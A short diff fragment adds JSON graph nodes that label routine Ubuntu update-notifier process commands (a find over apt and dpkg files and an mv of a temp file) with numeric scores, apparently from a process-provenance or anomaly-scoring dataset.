+        "id": "6a7538d28951fb0335063952713d4b7a"
+    },
+    {
+        "label": "find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/ \nupdates-available -print -quit procname.find 27.767642974853516",
+        "score": "27.767642974853516",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "2b4f474ccfe3e29c611c77d4059a4db5"
+    },
+    {
+        "label": "mv /var/lib/update-notifier/tmp.qvwheXIVhx /var/lib/update-notifier/updates-available procname.mv 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "1cb04875cdaeb16ebda078e915d752bc"
+    }
+]
